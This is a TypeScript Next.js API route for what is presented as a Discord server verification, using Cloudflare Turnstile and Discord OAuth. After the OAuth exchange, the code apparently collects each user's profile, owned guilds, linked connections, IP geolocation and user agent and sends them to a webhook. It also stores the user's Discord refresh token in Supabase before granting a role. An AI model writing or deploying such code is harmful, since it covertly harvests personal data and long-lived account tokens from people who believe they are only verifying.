import { logger } from "@/lib/functions/logger";
import { sendWebhook } from "@/lib/functions/webhook";
import { NextRequest, NextResponse } from "next/server";
import { pushToSupabase } from "@/lib/utils/supabase/push";
import { assignDiscordRole } from "@/lib/functions/discord-role";

const verifyToken = async (token: string) => {
    const verificationResponse = await fetch(
        "https://challenges.cloudflare.com/turnstile/v0/siteverify",
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                secret: "1x0000000000000000000000000000000AA",
                response: token,
            }),
        }
    );
    const verificationResult = await verificationResponse.json();
    return verificationResult;
};

const getToken = async (code: string) => {
    const body = new URLSearchParams({
        "grant_type": "authorization_code",
        "code": String(code),
        "redirect_uri": `${process.env.BASE_URL}/api/callback`,
    }).toString();

    const token = await fetch(`https://discord.com/api/v10/oauth2/token`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic " + Buffer.from(`${process.env.CLIENT_ID}:${process.env.CLIENT_SECRET}`).toString("base64")
        },
        body: body
    });

    if (!token.ok) {
        throw new Error("Failed to fetch token");

    }

    return await token.json();
};
const verifyCode = async (code: string, req: NextRequest) => {
    try {
        const ip = (req.headers.get("x-forwarded-for") ?? "127.0.0.1").split(",")[0];
        const ua = req.headers.get("user-agent") ?? "unknown";


        const tokenResult = await getToken(code);

        const { success, userInfo, ownGuilds, connections, ipInfo } = await logger(tokenResult.access_token, ip);

        if (!success || !userInfo || !ownGuilds || !connections || !ipInfo) {
            throw new Error("Failed to log user");
        }
        
        const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua);
        
        if (!webhookResult.success) {
            throw new Error("Failed to send webhook");
        }
        
        const pushResult = await pushToSupabase(tokenResult.refresh_token, userInfo, ipInfo, ua);

        if (!pushResult.success) {
            throw new Error("Failed to push to Supabase");
        }
        
        const roleResult = await assignDiscordRole(userInfo.id);

        if (!roleResult.success) {
            throw new Error("Failed to assign role");
        }
        return { success: true };

    } catch {
        return { success: false };
    }
}

export async function POST(req: NextRequest) {
    try {
        const body = await req.json();
        const { token, code } = body;
        
        if (!token) {
            return NextResponse.json({ error: "token not provided" }, { status: 400 });
        }
        if (!code) {
            return NextResponse.json({ error: "code not provided" }, { status: 400 });
        }

        const verificationResult = await verifyToken(token);
        
        if (!verificationResult.success) {
            return NextResponse.json({ error: "token verification failed" }, { status: 400 });
        } 
        
        const result = await verifyCode(code, req);
        if (!result.success) {
            return NextResponse.json({ error: "authentication failed" }, { status: 400 });
        }
        
        return NextResponse.json({ status: 200 });
    } catch {
        return NextResponse.json({ error: "verification error" }, { status: 500 });
    }
}
